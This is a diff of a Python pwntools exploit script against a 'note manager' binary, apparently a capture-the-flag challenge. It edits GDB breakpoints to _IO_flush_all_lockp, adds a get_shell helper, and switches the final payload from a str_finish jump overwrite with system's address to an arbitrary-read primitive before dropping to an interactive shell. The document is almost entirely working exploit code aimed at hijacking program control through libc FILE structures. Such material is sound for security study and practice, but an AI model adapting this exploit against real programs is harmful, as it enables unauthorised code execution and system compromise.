@@ -12,8 +12,10 @@ import base64
 libc = ELF( './libc.so.6')
 
 gs = '''
-b _start
 b main
+continue
+b _IO_flush_all_lockp
+continue
 '''
 def start():
     if args.GDB:
@@ -46,6 +48,9 @@ def show_message(func):
         return func(*args,**kwargs)
     return run_func
     #io.recvuntil("6. exit the note manager")
+@show_message
+def get_shell():
+    io.sendline("6")
 @show_message
 def add_note(note_id,context):
     #send 1
@@ -206,8 +211,8 @@ fake_plus = "A"*50+'\x00'
 add_note("8","testdddd")
 
 #get shell
-modify_note("8 1080",get_str_finish_jmp()+(p64(system_address)+p64(system_address)).decode('unicode-escape'))
-#modify_note("8 1080",get_arbitrary_read())
+#modify_note("8 1080",get_str_finish_jmp()+(p64(system_address)+p64(system_address)).decode('unicode-escape'))
+modify_note("8 1080",get_arbitrary_read())
 
-
+get_shell()
 io.interactive()
